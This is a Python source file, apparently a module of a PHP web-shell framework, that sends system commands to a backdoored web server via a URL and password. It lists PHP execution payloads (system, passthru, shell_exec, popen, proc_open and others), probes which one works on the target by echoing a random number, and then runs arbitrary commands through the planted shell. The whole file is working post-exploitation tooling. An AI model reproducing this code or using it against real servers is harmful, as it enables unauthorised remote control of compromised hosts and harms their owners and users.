'''
Created on 22/ago/2011

@author: norby
'''

from core.module import Module, ModuleException
from core.vector import VectorList, Vector
import random

classname = 'Sh'
    
class Sh(Module):
    '''Shell to execute system commands
    :shell.sh "<command>" 
    '''
    
    visible = False
    
    vectors = VectorList([
            Vector('shell.php', "system", "system('%s 2>&1');"),
            Vector('shell.php', "passthru" , "passthru('%s 2>&1');"),
            Vector('shell.php', "shell_exec", "echo shell_exec('%s 2>&1');"),
            Vector('shell.php', "exec", "exec('%s 2>&1', $r); echo(join(\"\\n\",$r));"),
            Vector('shell.php', "pcntl_exec", "$args = array('%s'); pcntl_exec( '%s', $args );"),
            Vector('shell.php', "popen", "$h = popen('%s','r'); while(!feof($h)) echo(fread($h,4096)); pclose($h);"),
            Vector('shell.php', "python_eval", "python_eval('import os; os.system('%s 2>&1');"),
            Vector('shell.php', "perl->system", "$perl = new perl(); $r = @perl->system('%s 2>&1'); echo $r;"),
            Vector('shell.php', "proc_open", """$p = array(array('pipe', 'r'), array('pipe', 'w'), array('pipe', 'w'));                                                
$h = proc_open('%s', $p, $pipes); while(!feof($pipes[1])) echo(fread($pipes[1],4096));
while(!feof($pipes[2])) echo(fread($pipes[2],4096)); fclose($pipes[0]); fclose($pipes[1]);
fclose($pipes[2]); proc_close($h);"""),
            ])
    
#    vectors = { 'shell.php' : { 
#                               "system"       : "system('%s 2>&1');",
#                                "passthru"     : "passthru('%s 2>&1');",
#                                "shell_exec"   : "echo shell_exec('%s 2>&1');",
#                                "proc_open"    : "$p = array(array('pipe', 'r'), array('pipe', 'w'), array('pipe', 'w'));" + \
#                                                   "$h = proc_open('%s', $p, $pipes); while(!feof($pipes[1])) echo(fread($pipes[1],4096));" + \
#                                                   "while(!feof($pipes[2])) echo(fread($pipes[2],4096)); fclose($pipes[0]); fclose($pipes[1]);" + \
#                                                   "fclose($pipes[2]); proc_close($h);",
#                                "popen"        : "$h = popen('%s','r'); while(!feof($h)) echo(fread($h,4096)); pclose($h);",
#                                "python_eval"  : "python_eval('import os; os.system('%s 2>&1');",
#                                "pcntl_exec"   : "$args = array('%s'); pcntl_exec( '%s', $args );",
#                                "perl->system" : "$perl = new perl(); $r = @perl->system('%s 2>&1'); echo $r;",
#                                "exec"         : "exec('%s 2>&1', $r); echo(join(\"\\n\",$r));"
#                                
#                               }
#               }

    def __init__( self, modhandler , url, password):

        self.payload  = None
        self.cwd_vector = None

        try: 
            modhandler.load('shell.php')
        except ModuleException, e:
            pass
        else:
            Module.__init__(self, modhandler, url, password)
        
        if not self.payload:
            raise ModuleException("shell.sh",  "Shell interpreter initialization failed")
        
        
    def __execute_payload(self, vector):
        
        
        try:
            rand     = random.randint( 11111, 99999 )
            response = self.run( "echo %d" % rand, True, vector.payloads[0] )
            if response == str(rand):
                self.payload = vector.payloads[0]
                self.mprint("[%s] Loaded using method '%s'" % (self.name, vector.name))
                return True

        except:
            pass
        return False
        
        
    def _probe( self ):

        vectors = self._get_default_vector2() 
        if not vectors:
            vectors  = self.vectors.get_vectors_by_interpreters(self.modhandler.loaded_shells)
        
        for vector in vectors:
            response = self.__execute_payload(vector)
                
            if response:
                self.mprint('[%s] Loaded using \'%s\' method' % (self.name, vector.name))
                return response

                
        raise ModuleException(self.name,  "Error loading system shell interpreter")
                


    def run( self, cmd, err_to_stdout = True, payload = None ):
        
        if not payload:
            payload = self.payload

        if not err_to_stdout and ' 2>&1' in payload:
            payload = payload.replace(' 2>&1', '')

        if payload.count( '%s' ) == 1:
            payload = payload % cmd.replace( "'", "\\'" )
        else:
            args    = "','".join( cmd.split(' ')[1:] )
            cmd     = cmd.split()[0]
            payload = payload % ( args, cmd )
        
        return self.modhandler.load('shell.php').run(payload)



    
    
    